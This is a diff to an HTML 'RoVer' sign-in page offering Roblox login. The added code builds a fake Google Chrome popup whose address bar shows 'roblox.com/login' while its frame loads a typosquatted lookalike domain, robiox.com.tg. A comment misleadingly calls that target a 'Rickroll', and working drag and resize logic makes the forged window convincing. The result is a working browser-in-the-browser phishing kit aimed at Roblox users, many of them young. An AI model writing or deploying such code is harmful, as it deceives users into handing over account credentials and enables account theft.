@@ -1,97 +1,121 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>RoVer - Sign In</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
-    * {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
-    body {background:#1e1d1f;min-height:100vh;overflow-x:hidden;color:#fff;}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
+    body{background:#1e1d1f;min-height:100vh;overflow-x:hidden;color:#fff}
 
-    header {background:#e00078;height:56px;display:flex;align-items:center;padding:0 20px;position:relative;z-index:1001;}
-    .menu-btn {font-size:26px;color:#fff;cursor:pointer;background:none;border:none;margin-right:14px;}
-    .logo {font-size:20px;font-weight:600;color:#fff;display:flex;align-items:center;}
+    header{background:#e00078;height:56px;display:flex;align-items:center;padding:0 20px;position:relative;z-index:1001}
+    .menu-btn{font-size:26px;color:#fff;cursor:pointer;background:none;border:none;margin-right:14px}
+    .logo{font-size:20px;font-weight:600;color:#fff;display:flex;align-items:center}
 
-    .overlay {position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);opacity:0;visibility:hidden;transition:opacity 0.3s ease, visibility 0.3s ease;z-index:900;}
-    .overlay.active {opacity:1;visibility:visible;}
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;visibility:hidden;transition:.25s;z-index:900}
+    .overlay.active{opacity:1;visibility:visible}
 
-    .side-menu {position:fixed;top:0;left:-260px;width:260px;height:100%;background:#e00078;color:#fff;padding:20px;transition:0.3s;z-index:1002;}
-    .side-menu.active {left:0;}
-    .side-menu .close-btn {font-size:28px;cursor:pointer;margin-bottom:20px;display:block;background:none;border:none;color:#fff;}
-    .side-menu ul {list-style:none;}
-    .side-menu ul li {margin:14px 0;font-size:16px;}
-    .side-menu ul li a {text-decoration:none;color:#fff;display:block;padding:6px 10px;border-radius:4px;transition:background 0.2s;}
-    .side-menu ul li a.disabled {opacity:0.6;pointer-events:none;}
-    .side-menu ul li a.active {background:#fff;color:#000;}
+    .side-menu{position:fixed;top:0;left:-260px;width:260px;height:100%;background:#e00078;color:#fff;padding:20px;transition:.3s;z-index:1002}
+    .side-menu.active{left:0}
+    .side-menu .close-btn{font-size:28px;cursor:pointer;margin-bottom:20px;display:block;background:none;border:none;color:#fff}
+    .side-menu ul{list-style:none}
+    .side-menu ul li{margin:14px 0;font-size:16px}
+    .side-menu ul li a{text-decoration:none;color:#fff;display:block;padding:6px 10px;border-radius:4px;transition:background .2s}
+    .side-menu ul li a.disabled{opacity:.6;pointer-events:none}
+    .side-menu ul li a.active{background:#fff;color:#000}
 
-    .login-box {margin:80px auto;background:#000;padding:40px 30px;border-radius:6px;text-align:center;max-width:420px;width:90%;color:#fff;position:relative;z-index:1;transition:opacity 0.4s ease, transform 0.4s ease;}
-    .login-box.hide {opacity:0;transform:scale(0.95);}
-    .login-box.show {opacity:1;transform:scale(1);}
+    .login-box{margin:80px auto;background:#000;padding:40px 30px;border-radius:6px;text-align:center;max-width:420px;width:90%;color:#fff;position:relative;z-index:1;transition:opacity .4s,transform .4s}
+    .login-box.hide{opacity:0;transform:scale(.95)}
+    .login-box.show{opacity:1;transform:scale(1)}
+    .login-box h2{font-size:24px;margin-bottom:8px;font-weight:600}
+    .login-box p{font-size:14px;margin-bottom:24px}
+    .login-box button{background:#e00078;color:#fff;border:none;padding:12px 28px;border-radius:22px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
+    .login-box button:hover{background:#b80062}
 
-    .login-box h2 {font-size:24px;margin-bottom:8px;font-weight:600;}
-    .login-box p {font-size:14px;margin-bottom:24px;}
-    .login-box button {background:#e00078;color:#fff;border:none;padding:12px 28px;border-radius:22px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.2s;}
-    .login-box button:hover {background:#b80062;}
+    .oauth-box{background:#111;border-radius:8px;padding:30px 25px;text-align:center}
+    .oauth-box .top{font-size:22px;font-weight:700;margin-bottom:15px;text-align:left}
+    .oauth-box p.subtitle{font-size:14px;color:#ccc;margin:10px 0 20px;text-align:left}
+    .oauth-box hr{border:none;border-top:1px solid #333;margin:20px 0}
+    .oauth-box p.app-name{margin-bottom:20px;font-weight:600}
+    .oauth-box button.continue{background:#fff;color:#000;border:none;padding:12px;border-radius:6px;font-size:15px;width:100%;margin-bottom:15px;cursor:pointer}
+    .oauth-box p.or{margin:10px 0;color:#888}
+    .oauth-box button.return{background:#111;color:#fff;border:1px solid #333;padding:12px;border-radius:6px;font-size:15px;width:100%;cursor:pointer}
 
-    .oauth-box {background:#111;border-radius:8px;padding:30px 25px;text-align:center;}
-    .oauth-box .top {font-size:22px;font-weight:700;margin-bottom:15px;text-align:left;}
-    .oauth-box p.subtitle {font-size:14px;color:#ccc;margin:10px 0 20px;text-align:left;}
-    .oauth-box hr {border:none;border-top:1px solid #333;margin:20px 0;}
-    .oauth-box p.app-name {margin-bottom:20px;font-weight:600;}
-    .oauth-box button.continue {background:#fff;color:#000;border:none;padding:12px;border-radius:6px;font-size:15px;width:100%;margin-bottom:15px;cursor:pointer;}
-    .oauth-box p.or {margin:10px 0;color:#888;}
-    .oauth-box button.return {background:#111;color:#fff;border:1px solid #333;padding:12px;border-radius:6px;font-size:15px;width:100%;cursor:pointer;}
+    .extra-space{height:400px}
+    footer{background:#18181a;padding:30px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;color:#ccc;font-size:14px}
+    footer .left{font-size:13px}
+    footer .right{display:flex;flex-wrap:wrap;gap:20px}
+    footer a{color:#ccc;text-decoration:none}
+    footer a:hover{ text-decoration:underline }
+    .footer-logo{font-weight:700;font-size:18px;background:linear-gradient(to right,#ff4da6,#ff6600);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;display:inline-block}
 
-    .extra-space {height:400px;}
-    footer {background:#18181a;padding:30px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;color:#ccc;font-size:14px;}
-    footer .left {font-size:13px;}
-    footer .right {display:flex;flex-wrap:wrap;gap:20px;}
-    footer a {color:#ccc;text-decoration:none;}
-    footer a:hover {text-decoration:underline;}
-    .footer-logo {font-weight:700;font-size:18px;background:linear-gradient(to right, #ff4da6, #ff6600);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;display:inline-block;}
+    /* Popup overlay */
+    #popupOverlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;visibility:hidden;transition:.25s;z-index:1990}
+    #popupOverlay.active{opacity:1;visibility:visible}
 
-    /* === IFRAME POPUP === */
-    .iframe-popup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) scale(0.9);
-      width: 800px;
-      height: 600px;
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
-      opacity: 0;
-      visibility: hidden;
-      transition: all 0.3s ease;
-      z-index: 2000;
-      overflow: hidden;
+    /* Chrome-style window: starts 320x640 content; can be resized/maximized */
+    .mock-window{
+      position:fixed;
+      width:320px;             /* content width = 320 */
+      height:712px;            /* 640 content + 32 titlebar + 40 toolbar */
+      left:calc(50% - 160px);
+      top:24px;
+      background:#15171c;color:#d1d5db;border-radius:8px;
+      box-shadow:0 18px 50px rgba(0,0,0,.45);
+      overflow:hidden; opacity:0; visibility:hidden;
+      transition:.2s opacity, .2s transform; z-index:2000;
     }
-    .iframe-popup.active {
-      opacity: 1;
-      visibility: visible;
-      transform: translate(-50%, -50%) scale(1);
+    .mock-window.active{opacity:1;visibility:visible}
+    .mock-window.max{
+      left:8px !important; top:8px !important;
+      width:calc(100vw - 16px) !important; height:calc(100vh - 16px) !important;
     }
-    .iframe-popup iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
+
+    .mw-titlebar{height:32px;display:grid;grid-template-columns:1fr auto;align-items:center;padding:0 8px;gap:8px;background:#2b2d31;border-bottom:1px solid rgba(255,255,255,.06);user-select:none;cursor:grab;touch-action:none}
+    .mw-left{display:flex;align-items:center;gap:8px;min-width:0}
+    .mw-logo{width:14px;height:14px}
+    .mw-title{font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.9}
+    .mw-controls{display:grid;grid-auto-flow:column;grid-auto-columns:46px;height:100%}
+    .mw-btn{appearance:none;border:0;background:transparent;color:#cfd3da;display:grid;place-items:center;cursor:pointer}
+    .mw-btn:hover{background:rgba(255,255,255,.08)}
+    .mw-btn.close:hover{background:#e81123;color:#fff}
+    .mw-ico{width:16px;height:16px;display:block}
+    .mw-ico line,.mw-ico rect,.mw-ico path{stroke:currentColor;stroke-width:1.6;vector-effect:non-scaling-stroke}
+    .mw-ico.min line{stroke-linecap:square}
+    .mw-ico.max rect{fill:none}
+    .mw-ico.close-x path{stroke-linecap:square}
+
+    .mw-toolbar{height:40px;display:flex;align-items:center;gap:8px;padding:0 8px;background:#1f232a;border-bottom:1px solid rgba(255,255,255,.06);user-select:none}
+
+    .mw-omnibox{position:relative;display:flex;align-items:center;gap:8px;flex:1;height:28px;background:#0f1217;color:#e5e7eb;border:1px solid #374151;border-radius:14px;padding:0 10px}
+    .mw-omnibox .lock{width:14px;height:14px;color:#10b981}
+    .mw-omnibox input{flex:1;background:transparent;color:inherit;border:0;outline:0;font:inherit;cursor:default}
+    .mw-omnibox input[readonly]{opacity:.95}
+
+    /* Content: fills window below bars. Default is 320x640 because window is 320x712 */
+    .mw-content{
+      position:relative;
+      width:100%;
+      height:calc(100% - 32px - 40px);
+      background:#181a20;
     }
-    .iframe-close {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      background: #e00078;
-      color: #fff;
-      border: none;
-      border-radius: 50%;
-      width: 28px;
-      height: 28px;
-      font-size: 16px;
-      cursor: pointer;
-      z-index: 10;
+    .mw-frame{
+      position:absolute; left:0; top:0;
+      width:100%; height:100%;
+      border:0; background:#0b0e13; display:block;
     }
+
+    /* Resizers for extending the window */
+    .resizer{position:absolute;touch-action:none;z-index:5}
+    .resizer.n{cursor:ns-resize;top:-4px;left:0;right:0;height:8px}
+    .resizer.s{cursor:ns-resize;bottom:-4px;left:0;right:0;height:8px}
+    .resizer.e{cursor:ew-resize;right:-4px;top:0;bottom:0;width:8px}
+    .resizer.w{cursor:ew-resize;left:-4px;top:0;bottom:0;width:8px}
+    .resizer.ne{cursor:nesw-resize;right:-6px;top:-6px;width:12px;height:12px}
+    .resizer.nw{cursor:nwse-resize;left:-6px;top:-6px;width:12px;height:12px}
+    .resizer.se{cursor:nwse-resize;right:-6px;bottom:-6px;width:12px;height:12px}
+    .resizer.sw{cursor:nesw-resize;left:-6px;bottom:-6px;width:12px;height:12px}
   </style>
 </head>
 <body>
@@ -119,7 +143,6 @@
       <p>You must be 13 years of age or older to continue.</p>
       <button onclick="showOAuth()">Log in with Roblox</button>
     </div>
-
     <div class="extra-space"></div>
   </main>
 
@@ -144,31 +167,75 @@
     </div>
   </footer>
 
-  <!-- === POPUP STRUCTURE === -->
-  <div class="iframe-popup" id="iframePopup">
-    <button class="iframe-close" onclick="closeIframe()">✕</button>
-    <iframe src=""></iframe>
+  <!-- Popup overlay + Chrome-style mock window -->
+  <div id="popupOverlay" class="overlay"></div>
+
+  <div id="mockWin" class="mock-window" aria-hidden="true">
+    <div class="mw-titlebar" id="mwTitlebar">
+      <div class="mw-left">
+        <img class="mw-logo" src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome" />
+        <div class="mw-title" id="mwTitle">Preview — Google Chrome</div>
+      </div>
+      <div class="mw-controls">
+        <button class="mw-btn" title="Minimize" aria-label="Minimize">
+          <svg class="mw-ico min" viewBox="0 0 16 16"><line x1="3" y1="8.5" x2="13" y2="8.5"/></svg>
+        </button>
+        <button id="mwMax" class="mw-btn" title="Maximize" aria-label="Maximize">
+          <svg class="mw-ico max" viewBox="0 0 16 16"><rect x="3.5" y="3.5" width="9" height="9"/></svg>
+        </button>
+        <button id="mwClose" class="mw-btn close" title="Close" aria-label="Close">
+          <svg class="mw-ico close-x" viewBox="0 0 16 16"><path d="M3.8 3.8L12.2 12.2M12.2 3.8L3.8 12.2"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="mw-toolbar" id="mwToolbar">
+      <div class="mw-omnibox" id="mwOmni">
+        <svg class="lock" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M7 10V8a5 5 0 0 1 10 0v2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
+          <rect x="5" y="10" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.6"/>
+        </svg>
+        <input id="mwUrl" readonly value="https://roblox.com/login" spellcheck="false" />
+      </div>
+    </div>
+
+    <div class="mw-content">
+      <!-- Starts 320×640; grows when resized/maximized -->
+      <iframe id="mwFrame"
+              class="mw-frame"
+              title="Preview frame"
+              allow="fullscreen; accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen></iframe>
+    </div>
+
+    <!-- Resize handles -->
+    <div class="resizer n"  data-dir="n"></div>
+    <div class="resizer e"  data-dir="e"></div>
+    <div class="resizer s"  data-dir="s"></div>
+    <div class="resizer w"  data-dir="w"></div>
+    <div class="resizer ne" data-dir="ne"></div>
+    <div class="resizer se" data-dir="se"></div>
+    <div class="resizer sw" data-dir="sw"></div>
+    <div class="resizer nw" data-dir="nw"></div>
   </div>
 
   <script>
+    // Displayed URL vs actual iframe content
+    const DISPLAY_URL = 'https://roblox.com/login'; // omnibox
+    const FRAME_URL   = 'https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F418536882031%2Fprofile'; // Rickroll
+
+    // Side menu
     const menuBtn = document.querySelector('.menu-btn');
     const sideMenu = document.getElementById('sideMenu');
     const overlay = document.getElementById('overlay');
-    const iframePopup = document.getElementById('iframePopup');
-    const iframe = iframePopup.querySelector('iframe');
-
-    function toggleMenu() {
-      sideMenu.classList.toggle('active');
-      overlay.classList.toggle('active');
-    }
-
+    function toggleMenu(){ sideMenu.classList.toggle('active'); overlay.classList.toggle('active'); }
     menuBtn.addEventListener('click', toggleMenu);
     overlay.addEventListener('click', toggleMenu);
 
-    function showOAuth() {
+    // OAuth: show Continue
+    function showOAuth(){
       const box = document.getElementById("loginBox");
-      box.classList.remove("show");
-      box.classList.add("hide");
+      box.classList.remove("show"); box.classList.add("hide");
       setTimeout(() => {
         box.innerHTML = `
           <h2>Sign in to RoVer</h2>
@@ -182,34 +249,235 @@
             <button class="return" onclick="location.reload()">Return to RoVer</button>
           </div>
         `;
-        box.classList.remove("hide");
-        box.classList.add("show");
+        box.classList.remove("hide"); box.classList.add("show");
       }, 400);
     }
 
-    function openLogin() {
-      iframe.src = "example.com";
-      iframePopup.classList.add("active");
+    // Popup logic
+    const mockWin    = document.getElementById('mockWin');
+    const popOv      = document.getElementById('popupOverlay');
+    const mwClose    = document.getElementById('mwClose');
+    const mwMax      = document.getElementById('mwMax');
+    const mwFrame    = document.getElementById('mwFrame');
+    const mwUrl      = document.getElementById('mwUrl');
+    const mwTitle    = document.getElementById('mwTitle');
+    const mwTitlebar = document.getElementById('mwTitlebar');
+    const mwToolbar  = document.getElementById('mwToolbar');
+    const resizers   = document.querySelectorAll('.resizer');
+
+    const TITLEBAR_H = 32;
+    const TOOLBAR_H  = 40;
+    const TOPBAR_H   = TITLEBAR_H + TOOLBAR_H; // 72px
+    const SIDE_ANCHOR   = 40;  // keep at least 40px visible horizontally
+    const TOP_VISIBLE   = 12;  // keep at least 12px of top bar visible
+    const BOTTOM_ANCHOR = 40;  // keep at least 40px visible at bottom
+    const MIN_W = 320;
+    const MIN_H = 712;
+
+    function toEmbed(u){
+      try{
+        const url = new URL(u.trim());
+        const h = url.hostname.replace(/^www\./,'').toLowerCase();
+        if (h === 'youtu.be'){
+          const id = url.pathname.slice(1);
+          if (id) return 'https://www.youtube-nocookie.com/embed/' + id;
+        }
+        if (h.endsWith('youtube.com') || h.endsWith('youtube-nocookie.com')){
+          if (url.pathname === '/watch'){
+            const id = url.searchParams.get('v');
+            if (id) return 'https://www.youtube-nocookie.com/embed/' + id;
+          }
+          const shorts = url.pathname.match(/^\/shorts\/([A-Za-z0-9_-]+)/);
+          if (shorts) return 'https://www.youtube-nocookie.com/embed/' + shorts[1];
+          const emb = url.pathname.match(/^\/embed\/([A-Za-z0-9_-]+)/);
+          if (emb) return 'https://www.youtube-nocookie.com/embed/' + emb[1];
+        }
+        return u;
+      } catch { return u; }
     }
 
-    function closeIframe() {
-      iframePopup.classList.remove("active");
-      iframe.src = "example.com";
+    function setTitle(u){
+      try{ mwTitle.textContent = (new URL(u)).host + ' — Google Chrome'; }
+      catch{ mwTitle.textContent='Preview — Google Chrome'; }
     }
-  </script>
 
-  <!-- APPENDED (no changes above): force full https example.com on Continue -->
-  <script>
+    function clampPosition(L, T, w, h){
+      // Horizontal: keep 40px visible
+      const minL = SIDE_ANCHOR - w;
+      const maxL = window.innerWidth  - SIDE_ANCHOR;
+
+      // Vertical: keep a bit of the top bar visible and 40px bottom
+      const minT = TOP_VISIBLE - TOPBAR_H;
+      const maxT = window.innerHeight - BOTTOM_ANCHOR;
+
+      const Lc = Math.min(Math.max(L, Math.min(minL, maxL)), Math.max(minL, maxL));
+      const Tc = Math.min(Math.max(T, Math.min(minT, maxT)), Math.max(minT, maxT));
+      return { L: Lc, T: Tc };
+    }
+
+    function centerMock(){
+      const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+      let L = (window.innerWidth - w) / 2;
+      let T = 24; // ensure the top bar is visible initially
+      const {L: cL, T: cT} = clampPosition(L, T, w, h);
+      mockWin.style.left = cL + 'px';
+      mockWin.style.top  = cT + 'px';
+    }
+
+    function openLogin(){
+      // Show roblox.com/login in the bar, but load the Rickroll in the frame
+      mwUrl.value = DISPLAY_URL;
+      setTitle(DISPLAY_URL);
+      mwFrame.src = toEmbed(FRAME_URL);
+      mockWin.classList.add('active');
+      popOv.classList.add('active');
+      centerMock();
+    }
+
+    function closeMock(){
+      mockWin.classList.remove('active','dragging','max');
+      popOv.classList.remove('active');
+      mwFrame.src = 'about:blank';
+    }
+
+    mwClose.addEventListener('click', closeMock);
+    popOv.addEventListener('click', closeMock);
+
+    // Maximize/restore (no permissions needed)
+    let lastGeom = null;
+    mwMax.addEventListener('click', () => {
+      if (mockWin.classList.contains('max')) {
+        // restore
+        mockWin.classList.remove('max');
+        if (lastGeom){
+          mockWin.style.left   = lastGeom.left + 'px';
+          mockWin.style.top    = lastGeom.top  + 'px';
+          mockWin.style.width  = lastGeom.width  + 'px';
+          mockWin.style.height = lastGeom.height + 'px';
+        }
+        mwMax.title = 'Maximize'; mwMax.setAttribute('aria-label','Maximize');
+      } else {
+        // save current geometry and maximize
+        const r = mockWin.getBoundingClientRect();
+        lastGeom = { left:r.left, top:r.top, width:r.width, height:r.height };
+        mockWin.classList.add('max');
+        mwMax.title = 'Restore'; mwMax.setAttribute('aria-label','Restore');
+      }
+    });
+
+    // Drag from the TOP ONLY (titlebar or toolbar)
     (function(){
-      var popup = document.getElementById('iframePopup');
-      var frame = popup ? popup.querySelector('iframe') : null;
-      var originalOpenLogin = window.openLogin;
-      window.openLogin = function(){
-        if (frame) frame.src = 'https://example.com';
-        if (popup) popup.classList.add('active');
-        // originalOpenLogin is not called to avoid resetting the src to the non-https value
-      };
+      let dragging=false, offX=1, offY=0;
+
+      function canStartDrag(e){
+        if (mockWin.classList.contains('max')) return false; // don't drag while maximized
+        if (e.pointerType === 'mouse' && e.button !== 0) return false; // left click only
+        const t = e.target;
+        if (t.closest('input,textarea,button,a,[role="button"]')) return false;
+        return true;
+      }
+
+      function start(e){
+        if (!canStartDrag(e)) return;
+        dragging = true;
+        const r = mockWin.getBoundingClientRect();
+        offX = e.clientX - r.left;
+        offY = e.clientY - r.top;
+        mockWin.classList.add('dragging');
+        e.currentTarget.setPointerCapture?.(e.pointerId);
+        e.preventDefault();
+      }
+
+      function move(e){
+        if (!dragging) return;
+        const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+        let L = e.clientX - offX;
+        let T = e.clientY - offY;
+        const {L: cL, T: cT} = clampPosition(L, T, w, h);
+        mockWin.style.left = cL + 'px';
+        mockWin.style.top  = cT + 'px';
+      }
+
+      function end(e){
+        if (!dragging) return;
+        dragging = false;
+        mockWin.classList.remove('dragging');
+        e.currentTarget.releasePointerCapture?.(e.pointerId);
+      }
+
+      [mwTitlebar, mwToolbar].forEach(el=>{
+        el.addEventListener('pointerdown', start);
+        el.addEventListener('pointermove', move);
+        el.addEventListener('pointerup', end);
+        el.addEventListener('pointercancel', end);
+        el.addEventListener('lostpointercapture', end);
+      });
     })();
+
+    // Resize with pointer capture (extend from edges/corners)
+    (function(){
+      let resizing=false, dir='', start=null, sx=0, sy=0, handle=null;
+
+      function onDown(e){
+        if (mockWin.classList.contains('max')) return; // no resize when maximized
+        if (e.pointerType === 'mouse' && e.button !== 0) return;
+        resizing = true; dir = this.dataset.dir; handle=this;
+        const r = mockWin.getBoundingClientRect();
+        start = { left:r.left, top:r.top, right:r.right, bottom:r.bottom, width:r.width, height:r.height };
+        sx = e.clientX; sy = e.clientY;
+        handle.setPointerCapture?.(e.pointerId);
+        e.preventDefault();
+      }
+      function onMove(e){
+        if (!resizing) return;
+        const dx = e.clientX - sx, dy = e.clientY - sy;
+        let L = start.left, T = start.top, W = start.width, H = start.height;
+
+        if (dir.includes('e')) W = Math.max(MIN_W, start.width  + dx);
+        if (dir.includes('s')) H = Math.max(MIN_H, start.height + dy);
+        if (dir.includes('w')){
+          const nl = Math.min(start.right - MIN_W, start.left + dx);
+          W = start.right - nl; L = nl;
+        }
+        if (dir.includes('n')){
+          const nt = Math.min(start.bottom - MIN_H, start.top + dy);
+          H = start.bottom - nt; T = nt;
+        }
+
+        const clamped = clampPosition(L, T, W, H);
+        mockWin.style.left   = clamped.L + 'px';
+        mockWin.style.top    = clamped.T + 'px';
+        mockWin.style.width  = W + 'px';
+        mockWin.style.height = H + 'px';
+      }
+      function onUp(e){
+        if (!resizing) return;
+        resizing = false;
+        handle?.releasePointerCapture?.(e.pointerId);
+        handle = null;
+      }
+
+      resizers.forEach(h=>{
+        h.addEventListener('pointerdown', onDown);
+        h.addEventListener('pointermove', onMove);
+        h.addEventListener('pointerup', onUp);
+        h.addEventListener('pointercancel', onUp);
+        h.addEventListener('lostpointercapture', onUp);
+      });
+    })();
+
+    // Keep top bar visible on resize
+    window.addEventListener('resize', () => {
+      if (!mockWin.classList.contains('active')) return;
+      if (mockWin.classList.contains('max')) return; // max fills viewport already
+      const rect = mockWin.getBoundingClientRect();
+      const {L: cL, T: cT} = clampPosition(rect.left, rect.top, rect.width, rect.height);
+      mockWin.style.left = cL + 'px';
+      mockWin.style.top  = cT + 'px';
+    });
+
+    // Expose for the Continue button
+    window.openLogin = openLogin;
   </script>
 </body>
 </html>
